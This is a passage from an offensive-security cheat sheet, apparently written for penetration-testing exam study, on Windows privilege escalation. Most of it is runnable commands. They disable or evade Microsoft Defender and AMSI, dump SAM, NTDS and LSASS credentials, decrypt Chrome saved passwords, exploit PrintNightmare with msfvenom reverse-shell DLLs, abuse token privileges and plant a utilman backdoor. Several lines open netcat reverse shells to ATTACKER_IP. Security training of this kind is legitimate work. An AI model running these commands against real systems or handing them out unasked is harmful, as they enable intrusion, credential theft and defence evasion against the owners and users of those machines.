:: Detect WoW64 redirection — if PROCESSOR_ARCHITECTURE is x86 on a 64-bit OS, you are in WoW64
echo %PROCESSOR_ARCHITECTURE%
:: x86 = 32-bit process on 64-bit OS (WoW64 active)
:: AMD64 = native 64-bit process (no escape needed)

:: Confirm OS is actually 64-bit
wmic os get osarchitecture

:: Escape — spawn 64-bit cmd.exe via Sysnative virtual path
:: Sysnative is a kernel-provided alias that bypasses WoW64 redirection
C:\Windows\Sysnative\cmd.exe /c whoami
C:\Windows\Sysnative\cmd.exe

:: 64-bit PowerShell from 32-bit context
C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe -ep bypass
```

```powershell
# PowerShell detection and escape
if ([IntPtr]::Size -eq 4 -and [Environment]::Is64BitOperatingSystem) {
    Write-Output "[!] Running in WoW64 (32-bit) — escaping to 64-bit"
    & "$env:SystemRoot\Sysnative\WindowsPowerShell\v1.0\powershell.exe" -ep bypass -NoProfile
} else {
    Write-Output "[+] Already in native 64-bit context"
}

# Generate a 64-bit reverse shell from a 32-bit foothold
C:\Windows\Sysnative\cmd.exe /c "C:\Windows\Temp\nc64.exe <ATTACKER_IP> <PORT> -e C:\Windows\Sysnative\cmd.exe"
```

#### Living-off-the-land / LOTL variant

```cmd
:: Pure cmd.exe — no tools needed
:: Check architecture then call Sysnative directly
if "%PROCESSOR_ARCHITECTURE%"=="x86" (
    echo [!] WoW64 detected — spawning 64-bit shell
    C:\Windows\Sysnative\cmd.exe
) else (
    echo [+] Already 64-bit
)
```

### 4.12 Windows Defender Evasion Tips

```powershell
# === Status / signature / engine version ===
Get-MpComputerStatus | Select RealTimeProtectionEnabled,AMSIEnabled,IsTamperProtected,AntivirusSignatureLastUpdated,AMServiceVersion
sc query WinDefend
sc query Sense                                                         # Defender for Endpoint sensor
Get-Service WinDefend, WdFilter, WdNisDrv, WdNisSvc, Sense

# === Tamper Protection check (TP blocks tamper attempts even from admin) ===
Get-MpComputerStatus | Select IsTamperProtected
# Registry probe (TP enabled if = 5)
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection

# === Exclusions — read (any user can read on default config; some installs require admin) ===
Get-MpPreference | Select ExclusionPath, ExclusionExtension, ExclusionProcess, ExclusionIpAddress
# Registry path:
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions"
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes"

# === Exclusions — add (admin, no Tamper Protection) ===
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
Add-MpPreference -ExclusionExtension ".ps1"
Add-MpPreference -ExclusionProcess "powershell.exe"
# Then drop payload into excluded path / use excluded extension

# === Disable Real-Time Protection (admin, no Tamper Protection) ===
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -MAPSReporting Disabled
Set-MpPreference -SubmitSamplesConsent NeverSend

# === MpCmdRun.exe — direct binary control ===
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
& "C:\ProgramData\Microsoft\Windows Defender\Platform\*\MpCmdRun.exe" -RemoveDefinitions -All
# After signature wipe, real-time scanning continues but with empty defs

# === Service kill (requires SYSTEM + TP off) ===
sc stop WinDefend
sc config WinDefend start= disabled
# WinDefend service kill blocked under TP — pivot to:
#   - SafeBoot trick: bcdedit /set {default} safeboot minimal && reboot (no Defender in safe mode)
#   - PPL bypass: Backstab / PPLDump (https://github.com/itm4n/PPLdump) to terminate as PPL
#   - Sigstop on lsass'd Defender process → unhook: requires kernel driver

# === GPO-based disable (lab + AD environments) ===
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
gpupdate /force

# === Disable AMSI per-process (no admin, current PowerShell only) ===
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# (See av-evasion.md Phase 1 for full bypass set)

# === Definition removal as transient evasion ===
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -DynamicSignatures   # nuke cloud sigs
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -SignatureUpdate                          # re-add (caution!)

# === Find Defender ASR rules in effect ===
Get-MpPreference | Select AttackSurfaceReductionRules_Ids, AttackSurfaceReductionRules_Actions

# === Identify protection level ===
Get-MpComputerStatus | Select QuickScanAge,FullScanAge,RealTimeProtectionEnabled,IoavProtectionEnabled,TamperProtectionSource
```

```bash
# === Obfuscation tooling references (already-present TTPs) ===
# Invoke-Obfuscation, Chimera, ConfuserEx (.NET), Garble (Go), llvm-obfuscator (C/C++)
# Nim / Rust / Go loaders — see av-evasion.md Phases 4-7
```

### 4.13 Detailed SeBackupPrivilege Exploitation

```powershell
# Check: whoami /priv → SeBackupPrivilege = Enabled

# Method 1: Copy SAM & SYSTEM hives directly (native, always works)
# Same `reg save HKLM\SAM/SYSTEM/SECURITY` pattern as §4.17 — works because
# SeBackupPrivilege bypasses ACL checks on the protected hives.

# Method 2: robocopy with /B flag (native — backup mode bypasses ACLs)
robocopy /B C:\Users\Administrator\Desktop\ C:\temp\ proof.txt
robocopy /B C:\Windows\NTDS\ C:\temp\ ntds.dit  # On DC!

# Method 3: esentutl.exe (native LOLBin — copies locked files without shadow copy)
esentutl.exe /y /vss C:\Windows\System32\config\SAM /d C:\temp\SAM
esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d C:\temp\SYSTEM
esentutl.exe /y /vss C:\Windows\NTDS\ntds.dit /d C:\temp\ntds.dit  # On DC!

# Method 4: diskshadow + robocopy (native — for locked files like NTDS.dit)
# Create diskshadow script:
echo "set context persistent nowriters" > C:\temp\diskshadow.txt
echo "add volume C: alias deadlock" >> C:\temp\diskshadow.txt
echo "create" >> C:\temp\diskshadow.txt
echo "expose %deadlock% Z:" >> C:\temp\diskshadow.txt
# Run diskshadow
diskshadow /s C:\temp\diskshadow.txt
# Copy from shadow
robocopy /B Z:\Windows\NTDS\ C:\temp\ ntds.dit
robocopy /B Z:\Windows\System32\config\ C:\temp\ SYSTEM

# Method 5: wbadmin (native Windows backup)
wbadmin start backup -backuptarget:C:\temp\ -include:C:\Windows\NTDS\ntds.dit -quiet
```

### 4.14 PrintNightmare — Local Privilege Escalation

> **Applies when:** Spooler running + missing one of (KB5005010/5005573/5004945/5005565/5005568/5005613), OR `PointAndPrint!RestrictDriverInstallationToAdministrators=0`. Spooler is disabled by default on DCs post-Aug 2021 but routinely runs on member servers and lab/exam DCs.
> **Test cost:** ~5s — `netexec smb -M printnightmare`; always run.
> **If patched:** check Point-and-Print policy (config bypasses the patch) → if locked down, abandon spooler path.

#### Pre-Check — Spooler State & Driver Inventory

Before attempting CVE-2021-1675/34527 confirm Spooler is reachable, the relevant patch is missing, and the host loads drivers without admin (`PointAndPrint` policies).

```powershell
# Service state — must be Running for both LPE and remote RCE variants
Get-Service Spooler
sc.exe query Spooler
# 'STATE : 4 RUNNING' = exploitable

# Quick remote check — from Linux, hits MS-RPRN over SMB named pipe
rpcdump.py @<TARGET> | grep -i 'MS-RPRN\|MS-PAR'
# 'MS-RPRN: Print System Remote Protocol' present → spooler exposed

# List installed print drivers — attacker uploads a malicious driver via this surface
Get-PrinterDriver | Format-Table Name,Manufacturer,DriverVersion,InfPath
Get-PrinterPort

# Patch state — PrintNightmare KBs (any one missing means likely vulnerable)
Get-HotFix | Where-Object { $_.HotFixID -in @('KB5005010','KB5005573','KB5004945','KB5005565','KB5005568','KB5005613') } |
  Format-Table HotFixID,InstalledOn

# Point-and-Print restrictions — if NoWarningNoElevationOnInstall = 1, *any* user can install drivers
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" 2>$null
# Look for: NoWarningNoElevationOnInstall (1=vuln), UpdatePromptSettings (2=vuln), RestrictDriverInstallationToAdministrators (0/missing=vuln)

# CVE check via netexec
netexec smb <TARGET> -u '<USER>' -p '<PASS>' -M printnightmare
netexec smb <TARGET> -u '<USER>' -p '<PASS>' -M spooler   # is spooler reachable
```

**Conditions for exploitation:**

| Condition | Variant |
|---|---|
| Spooler running + KBs missing | CVE-2021-34527 (RCE/LPE classic) |
| Spooler running + `RestrictDriverInstallationToAdministrators=0` | Point-and-Print abuse — any user adds malicious driver |
| Spooler reachable remotely + creds | Remote RCE via `rundll32 \\<ATTACKER>\share\evil.dll` |
| Spooler local + low-priv shell | LPE via `SharpPrintNightmare.exe shell.dll` |

```powershell
# CVE-2021-1675 / CVE-2021-34527 — Print Spooler RCE/LPE
# Affects: Windows 7/8/10/11, Server 2008-2022

# Check if Print Spooler is running
sc query Spooler
Get-Service Spooler

# From Linux (remote, requires valid creds):
# Generate DLL payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o shell.dll
# Host it on SMB share
impacket-smbserver share /path/to/dll -smb2support
# Exploit
python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> '\\<ATTACKER_IP>\share\shell.dll'

# From Windows (local LPE):
# Using SharpPrintNightmare:
# https://github.com/cube0x0/CVE-2021-1675 (SharpPrintNightmare)
.\SharpPrintNightmare.exe C:\temp\shell.dll
# Creates a new local admin account or executes payload as SYSTEM

# Metasploit (remote RCE — requires valid creds):
# msfconsole → use exploit/windows/dcerpc/cve_2021_1675_printnightmare
# set RHOSTS <TARGET_IP> → set SMBUser <USER> → set SMBPass <PASSWORD> → run
```

### 4.15 DPAPI Credential Extraction

> **⚠️ Chrome v127+ App-Bound Encryption (ABE):** As of Chrome 127 (July 2024), saved passwords and cookies are wrapped with an additional **App-Bound Encryption** layer that requires SYSTEM context (not just the user's DPAPI master key) to decrypt. Pure user-context SharpChrome / DonPAPI extraction **fails on cookies and recent password entries**. Workarounds: run as `NT AUTHORITY\SYSTEM` (PsExec-style elevation) and use a tool that handles ABE — [ChromeKatz](https://github.com/Meckazin/ChromeKatz), [xaitax/Chrome-App-Bound-Encryption-Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption), or `donpapi 1.5+`. Edge (Chromium) follows the same model from Edge 127+.

```powershell
# DPAPI protects browser passwords, WiFi keys, saved credentials

# With Mimikatz (requires admin):
.\mimikatz.exe "sekurlsa::dpapi" "exit"
.\mimikatz.exe "vault::cred /patch" "exit"

# Extract Chrome/Edge saved passwords (user-level, no admin needed sometimes):
# Credential files location:
# Chrome: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
# Edge: %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data

# Copy the SQLite DB → extract with SharpChrome or DonPAPI
# https://github.com/GhostPack/SharpDPAPI (includes SharpChrome)
.\SharpChrome.exe logins
.\SharpChrome.exe cookies

# WiFi passwords (requires admin):
netsh wlan show profile
netsh wlan show profile name="<SSID>" key=clear    # Shows plaintext password

# All WiFi passwords at once:
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @if "%j" NEQ "" (netsh wlan show profiles name="%j" key=clear | findstr "Key Content")

# Saved RDP credentials:
cmdkey /list
# If entries exist → use: runas /savecred /user:<DOMAIN>\<USER> cmd.exe

# Windows Credential Manager:
rundll32.exe keymgr.dll,KRShowKeyMgr
# Or via Mimikatz: vault::cred
```

#### Living-off-the-land equivalent — native `[ProtectedData]::Unprotect()` (pre-ABE only)

When Mimikatz / SharpDPAPI is blocked, `System.Security.Cryptography.ProtectedData` decrypts any user-context DPAPI blob without external tooling. On Win11 22H2+ / Server 2022+, `sqlite3.exe` ships in `C:\Windows\System32\` for parsing the resulting Chromium SQLite databases.

```powershell
# Pre-Chrome v127 / pre-Edge v127 — classic DPAPI unprotect of os_crypt master key
Add-Type -AssemblyName System.Security
$LocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
$json       = Get-Content $LocalState -Raw | ConvertFrom-Json
$encKeyB64  = $json.os_crypt.encrypted_key
$encKey     = [Convert]::FromBase64String($encKeyB64)
$encKey     = $encKey[5..($encKey.Length-1)]   # strip the 'DPAPI' header
$masterKey  = [System.Security.Cryptography.ProtectedData]::Unprotect(
                $encKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
# $masterKey is now the AES-GCM key for legacy v10/v11-prefixed blobs in Cookies / Login Data
[Convert]::ToBase64String($masterKey)

# Copy + parse the Login Data SQLite (Chrome locks the file — copy first)
Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" "$env:TEMP\logins.db"
# sqlite3.exe ships in System32 on Win11 22H2+ / Server 2022+
sqlite3.exe "$env:TEMP\logins.db" "SELECT origin_url, username_value, length(password_value) FROM logins;"
# password_value is the v10-prefixed AES-GCM ciphertext — decrypt with $masterKey
```

> **⚠️ CRITICAL 2026 LIMITATION — Chrome v127+ App-Bound Encryption (ABE):** Pure `[ProtectedData]::Unprotect()` **NO LONGER WORKS** for cookies and passwords saved on Chrome **v127+** (July 2024) or Edge v127+. The `os_crypt.app_bound_encrypted_key` field is double-wrapped: outer layer is **SYSTEM-context DPAPI**, requiring a SYSTEM-context COM call to `IElevator::DecryptData` (Chrome's out-of-process elevation service). The legacy `os_crypt.encrypted_key` path above only works for:
> - Chrome ≤ v126 profiles (or stale legacy entries that haven't been re-encrypted)
> - Other Chromium browsers that haven't shipped ABE yet (Brave, Opera — verify per-build)
> - Firefox (different model — NSS-encrypted `key4.db`, not DPAPI)
>
> **Working 2025–2026 ABE bypasses (NOT pure PowerShell):**
> | Tool | Method | Privs |
> | --- | --- | --- |
> | [ChromeKatz](https://github.com/Meckazin/ChromeKatz) | Reads decrypted cookies from running `chrome.exe` memory (DUMP_MEMORY) | User (Chrome must be running) |
> | [xaitax/Chrome-App-Bound-Encryption-Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) | Hijacks the IElevator COM interface from a SYSTEM context | **SYSTEM** |
> | GhostBrowser / cookie-monster | Memory scrape of network service worker | User (Chrome running) |
> | donpapi 1.5+ | Combines DPAPI master key extraction + ABE COM hijack | **SYSTEM** for ABE entries |
>
> Verify the user's installed Chromium version (`reg query "HKCU\Software\Google\Chrome\BLBeacon" /v version`) before choosing the path. The legacy `[ProtectedData]::Unprotect()` script still cracks WiFi keys, saved RDP creds, and any non-Chromium DPAPI blob.

### 4.16 RunAs / Stored Credential Abuse

```powershell
# Check for stored credentials
cmdkey /list

# If stored creds exist for a user:
runas /savecred /user:<USER> cmd.exe
runas /savecred /user:<USER> "C:\temp\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe"

# If you know credentials but can't use them directly:
runas /user:<DOMAIN>\<USER> cmd.exe
# Enter password when prompted

# PowerShell alternative:
$secpasswd = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $secpasswd)
Start-Process cmd.exe -Credential $cred
# Or: Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }
```

#### Discover the target app — enumerate .lnk shortcuts for runas /savecred references

`cmdkey /list` shows `Domain:interactive=<DOMAIN>\<USER>` but doesn't reveal which app the cred was saved for. The shortcut's Arguments field shows the original `runas /savecred /user:<DOMAIN>\<USER> "<APP_PATH>"` — confirms the target user and gives you a known-good app to invoke. Once `/savecred` is set, you can run **any** command with `runas /savecred /user:<DOMAIN>\<USER> cmd.exe` regardless of the original app.

```powershell
# Parse .lnk Arguments via WScript.Shell COM (cleanest approach)
$sh = New-Object -ComObject WScript.Shell
Get-ChildItem 'C:\' -Filter *.lnk -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
    try {
        $lnk = $sh.CreateShortcut($_.FullName)
        if ($lnk.Arguments -match 'savecred|runas|/user:') {
            [PSCustomObject]@{
                Path      = $_.FullName
                Target    = $lnk.TargetPath
                Arguments = $lnk.Arguments
            }
        }
    } catch {}
}
```

```powershell
# High-value paths — focus enumeration here first
# Public Desktop (apps shared across all users — hidden, use -Force)
Get-ChildItem 'C:\Users\Public\Desktop' -Filter *.lnk -Force
icacls 'C:\Users\Public\Desktop'

# Per-user Desktop / Start Menu
Get-ChildItem 'C:\Users\*\Desktop' -Filter *.lnk -Force -ErrorAction SilentlyContinue
Get-ChildItem 'C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu' -Filter *.lnk -Recurse -Force -ErrorAction SilentlyContinue

# All Users Start Menu
Get-ChildItem 'C:\ProgramData\Microsoft\Windows\Start Menu' -Filter *.lnk -Recurse -Force
```

```cmd
rem Fast cmd.exe one-liner — .lnk is binary but runas/savecred strings are ASCII-readable
dir /a C:\Users\Public
icacls C:\Users\Public\Desktop
for /R C:\ %f in (*.lnk) do @findstr /i "runas savecred" "%f" >nul 2>&1 && echo %f
```

```powershell
# Two-step variant — capture list first, then inspect content
Get-ChildItem 'C:\' -Filter *.lnk -Recurse -Force -ErrorAction SilentlyContinue |
    Select-Object -ExpandProperty FullName | Out-File C:\Windows\Temp\shortcuts.txt

ForEach ($file in (Get-Content C:\Windows\Temp\shortcuts.txt)) {
    Write-Output "=== $file ==="
    Get-Content $file -ErrorAction SilentlyContinue | Select-String -Pattern 'runas','savecred','/user:'
}
```

> **Tip:** Once a savecred entry exists in Credential Manager, the bound app doesn't matter — `runas /savecred /user:<DOMAIN>\<USER> cmd.exe` works regardless. The .lnk is just a discovery aid for confirming the target user and finding a known-good path that's already been blessed.

#### Living-off-the-land equivalent — `klist` ticket cache + `runas /netonly`

Native ticket inspection / injection without Rubeus or Mimikatz. Vista+ / Server 2008+, no admin for own session.

```cmd
:: List currently cached Kerberos tickets in the calling logon session
klist
klist tickets                       :: explicit alias
klist tgt                           :: only the TGT
klist sessions                      :: enumerate all logon sessions on the box (admin)

:: Purge tickets in the current session (force re-auth on next request)
klist purge
klist purge -li 0x3e7               :: purge for SYSTEM session (admin)

:: Inject DOMAIN credentials into a NEW process WITHOUT writing them to disk;
:: Kerberos tickets requested by that process come from the supplied creds.
:: /netonly = creds used ONLY for outbound network auth; local token stays current user.
runas /netonly /user:<DOMAIN>\<ADMIN> "powershell.exe"
runas /netonly /user:<DOMAIN>\<ADMIN> "cmd.exe"

:: From the spawned shell, prove the creds work without locking out the real account:
::   1) any DC touch acquires a TGT, klist confirms
dir \\<DC_FQDN>\sysvol > nul
klist
```

> **LOTL note:** `klist export` (kerbtray) was removed from modern `klist.exe` — it cannot dump `.kirbi` blobs. Exporting tickets from the LSA cache requires Rubeus `dump` or a custom `LsaCallAuthenticationPackage` P/Invoke. `runas /netonly` is benign and ubiquitous (helpdesk uses it daily), not flagged.

### 4.17 Dumping Credentials (Requires Admin)
```bash
# SAM + LSA + cached creds via impacket (remote, from attacker)
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<IP>
```

#### Native Methods (On Target — No External Tools)
```powershell
# === DUMP SAM/SYSTEM HIVES (cmd.exe native — always works with admin) ===
# 🔴 reg save against HKLM\SAM/SECURITY = EID 4688 reg.exe + 4663 ObjectAccess on \REGISTRY\MACHINE\SAM — Sigma/Defender signature; additive (no destructive write) but very noisy
reg save HKLM\SAM C:\temp\sam.bak
reg save HKLM\SYSTEM C:\temp\system.bak
reg save HKLM\SECURITY C:\temp\security.bak
# Transfer to attacker → parse offline:
impacket-secretsdump -sam sam.bak -system system.bak -security security.bak LOCAL

# === DUMP LSASS MEMORY ===
# Method 1: Task Manager → Details → lsass.exe → Create dump file (GUI only)

# Method 2: comsvcs.dll (native, no tools needed — most reliable)
# 🔴 alert-likely — Sysmon EID 10 (ProcessAccess on lsass.exe with GrantedAccess 0x1010/0x1FFFFF), Defender Behavior:Win32/LsassProcessHandleAccess, ASR rule {9e6c4e1f-…} blocks the handle outright
# First get LSASS PID:
tasklist /fi "imagename eq lsass.exe"
# Or: Get-Process lsass | Select-Object Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full
# >>> OPSEC: Defender 2024+ flags this exact rundll32+comsvcs+MiniDump pattern
#     (signature "Behavior:Win32/LsassProcessHandleAccess") and the ASR rule
#     "Block credential stealing from the Windows local security authority subsystem (lsass.exe)"
#     {GUID 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2} blocks ANY non-PPL handle to lsass with 0x1FFFFF.
#     Mitigations: (1) call MiniDumpWriteDump from a signed/trusted parent, (2) use a forked-process
#     dumper (nanodump --fork), (3) use the silent-process-exit registry key + WerFault, or
#     (4) PPLdump / mirror-dump if PPL is enabled on lsass.

# Method 3: PowerShell native (Out-Minidump or .NET reflection)
# Uses native .NET — no external tools:
$proc = Get-Process lsass
$file = "C:\temp\lsass.dmp"
$MiniDumpWriteDump = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting').GetNestedType('NativeMethods','NonPublic').GetMethod('MiniDumpWriteDump',[Reflection.BindingFlags]'NonPublic,Static')
# (Requires additional setup — use comsvcs.dll method above for simplicity)

# Method 4: ProcDump (Sysinternals — signed binary, less likely flagged)
# 🔴 still fires Sysmon EID 10 with high GrantedAccess on lsass — signed binary doesn't bypass ASR LSASS rule; modern EDR (CrowdStrike/Defender for Endpoint) flags procdump+lsass arg-pair regardless of signature
# https://learn.microsoft.com/en-us/sysinternals/downloads/procdump
procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp

# === PARSE LSASS DUMP OFFLINE (on attacker) ===
# https://github.com/skelsec/pypykatz
pypykatz lsa minidump lsass.dmp
# Or: mimikatz # sekurlsa::minidump lsass.dmp
```

#### Mimikatz (If Available)
```powershell
# https://github.com/gentilkiwi/mimikatz
# 🔴 textbook EDR alert — string "mimikatz" + "sekurlsa::logonpasswords" hit AMSI sigs; pair with AMSI bypass + obfuscation, or use pypykatz against an offline dump instead
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

#### Volume Shadow Copy (Native — For Locked Files)
```powershell
# Create shadow copy and extract SAM/SYSTEM from it
vssadmin create shadow /for=C:
# Note the shadow copy path from output, then:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\System32\config\SAM C:\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\System32\config\SYSTEM C:\temp\SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\System32\config\SECURITY C:\temp\SECURITY

# Cleanup
vssadmin delete shadows /shadow=<SHADOW_ID> /quiet
```

### 4.18 SeDebugPrivilege Exploitation
```powershell
# Check: whoami /priv → SeDebugPrivilege = Enabled
# This privilege allows debugging any process, including SYSTEM processes

# Method 1: Dump LSASS (most common use)
# Use comsvcs.dll or Mimikatz as shown in 4.17

# Method 2: Migrate into a SYSTEM process (Meterpreter)
# meterpreter> ps (find SYSTEM process like winlogon.exe)
# meterpreter> migrate <PID>

# Method 3: Process injection into SYSTEM process
# Use tools like: psgetsys.ps1, or manual CreateRemoteThread injection
# https://github.com/decoder-it/psgetsystem
# Target processes: winlogon.exe, lsass.exe, services.exe
Import-Module .\psgetsys.ps1
[MyProcess]::CreateProcessFromParent(<SYSTEM_PID>, "C:\temp\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe")
```

### 4.19 SeTakeOwnershipPrivilege Exploitation
```powershell
# Check: whoami /priv → SeTakeOwnershipPrivilege = Enabled
# Allows taking ownership of any securable object (files, registry keys, AD objects)

# Take ownership of a file
takeown /f C:\Windows\System32\config\SAM
icacls C:\Windows\System32\config\SAM /grant <USERNAME>:F

# Take ownership of a registry key
# PowerShell:
$key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\<SERVICE>", [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::TakeOwnership)
$acl = $key.GetAccessControl()
$acl.SetOwner([System.Security.Principal.NTAccount]"<USERNAME>")
$key.SetAccessControl($acl)

# Then modify the service ImagePath to point to your payload
reg add HKLM\SYSTEM\CurrentControlSet\Services\<SERVICE> /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\shell.exe" /f
# Restart the service
```

### 4.20 SeRestorePrivilege Exploitation
```powershell
# Check: whoami /priv → SeRestorePrivilege = Enabled
# Allows writing to any file/registry key regardless of ACLs

# Method 1: Overwrite a service binary
# Find a service running as SYSTEM with a writable (via SeRestore) binary path
sc qc <SERVICE_NAME>
# Replace the binary
copy C:\temp\shell.exe "C:\Program Files\<SERVICE>\service.exe"
sc stop <SERVICE_NAME>
sc start <SERVICE_NAME>

# Method 2: Write to utilman.exe for sticky keys-style backdoor
copy C:\temp\cmd.exe C:\Windows\System32\utilman.exe
# At RDP login screen → click Ease of Access → SYSTEM shell

# Method 3: Modify registry (same as SeTakeOwnership registry technique)
reg add HKLM\SYSTEM\CurrentControlSet\Services\<SERVICE> /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\shell.exe" /f
```

### 4.21 SeLoadDriverPrivilege Exploitation
```powershell
# Check: whoami /priv → SeLoadDriverPrivilege = Enabled
# Allows loading kernel drivers — can load a vulnerable driver for kernel code exec

# Classic technique: Load Capcom.sys (vulnerable driver with arbitrary code exec)
# 🔴 BYOVD = top-tier EDR alert. Capcom.sys is on every Microsoft Vulnerable Driver Blocklist (HVCI/WDAC) since 2023 — modern Windows blocks the load outright; older lab boxes log Sysmon EID 6 (DriverLoad) with the unsigned/known-bad hash. Engagement-only.
# 1. Download Capcom.sys and EoPLoadDriver
# https://github.com/TarlogicSecurity/EoPLoadDriver
# 2. Load the driver
.\EoPLoadDriver.exe System\CurrentControlSet\MyDriver C:\temp\Capcom.sys

# 3. Use ExploitCapcom to execute payload as SYSTEM
# https://github.com/tandasat/ExploitCapcom
.\ExploitCapcom.exe YOURCOMMAND

# Alternative: Use NTLoadDriver + Capcom.sys
# Reference: https://github.com/TarlogicSecurity/EoPLoadDriver
# Reference: https://github.com/tandasat/ExploitCapcom
```

### 4.21b SeManageVolumePrivilege Exploitation
```powershell
# Check: whoami /priv → SeManageVolumePrivilege = Enabled
# Allows managing volumes — can grant write access to any file on the system drive

# Method: Use SeManageVolumeExploit to get write access to C:\Windows\System32
# https://github.com/CsEnox/SeManageVolumeExploit

# 1. Run the exploit (grants full access to C:\ for current user)
.\SeManageVolumeExploit.exe

# 2. Now perform DLL hijacking on a SYSTEM service
# 🔴 alert-likely — file write into C:\Windows\System32\* by non-TrustedInstaller is a textbook Sysmon EID 11 + EDR file-write-to-protected-path alert. Engagement-validation only; in BB/disclosure work, demonstrate the *primitive* (write a marker .txt into System32) rather than dropping a payload DLL.
# Copy malicious DLL to System32 (e.g., replace a DLL loaded by a service)
# Common target: tzres.dll (loaded by systeminfo, w32tm, and other tools)
# Generate: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o tzres.dll
copy tzres.dll C:\Windows\System32\wbem\tzres.dll

# 3. Trigger the DLL load
systeminfo
# Or restart a service that loads the target DLL
```

### 4.21e SeCreateTokenPrivilege Exploitation
```powershell
# Direct call to NtCreateToken — forge an arbitrary access token without going through Logon flow.
# Holders: almost-never granted. If you ever see this on a service account, it's a misconfig — endgame in one step.
# PoC: SeCreateTokenPrivilege-Exploit (or any wrapper around NtCreateToken)
# https://github.com/decoder-it/CreateTokenExploit  (compile or use precompiled)

# Confirm
whoami /priv | findstr /i SeCreateToken

# Forge a token impersonating BUILTIN\Administrators + NT AUTHORITY\SYSTEM membership
.\CreateTokenExploit.exe
# → spawns cmd.exe with the forged token; whoami → nt authority\system

# Why this is rare: SeCreateToken is gated to LSA itself; granting it is almost always an admin error.
# When you see it on a service account or restricted user, no chain needed — single primitive to SYSTEM.
```

### 4.21f SeRelabelPrivilege Exploitation
```powershell
# SeRelabel = ability to lower the Mandatory Integrity Level of an object.
# Direct LPE: re-label a kernel object (driver / device / token) from System-IL → your IL,
# then write to it from low-IL code → kernel write-what-where.
# PoC requires kernel-write primitive elsewhere; SeRelabel alone is the IL-lowering step.

whoami /priv | findstr /i SeRelabel

# Common chain (lab + research only):
#   1. Identify a writable-as-kernel object you can demote (driver IOCTL surface, ALPC port, registry key)
#   2. Use SetTokenInformation / NtSetSecurityObject with a System-IL→User-IL relabel SACL
#   3. Write payload through the now-writable object → kernel exec
# Public PoCs: github search "SeRelabelPrivilege exploit" — most chain into a known driver vuln
# CPTS lab boxes: extremely rare — flag and pivot if you see it
```

### 4.21g SeCreateSymbolicLinkPrivilege Exploitation
```powershell
# NTFS file-level symlinks (vs junctions in §4.3d which are dir-only).
# Granted = misconfiguration: by default, only Administrators have it on workstations,
# Domain Admins on servers. If your low-priv user has it, you can create file symlinks
# pointing at protected files — anything that opens "your" file actually opens the target.

whoami /priv | findstr /i SeCreateSymbolicLink

# Common abuse:
#   - service writes to a "log file" you control → symlink it to C:\Windows\System32\drivers\<name>.sys (BYOVD)
#   - app reads "config" you create → symlink to C:\Users\Administrator\.aws\credentials
#   - update process replaces "your" binary → symlink to a protected service binary

# Create symlink (needs SeCreateSymbolicLink token)
mklink C:\path\you\control\harmless.txt C:\Windows\System32\config\SAM
```
```cmd
:: PowerShell native (no mklink permission check on tokens that have the priv)
New-Item -ItemType SymbolicLink -Path C:\users\public\harmless.txt -Target C:\Windows\System32\config\SAM
```
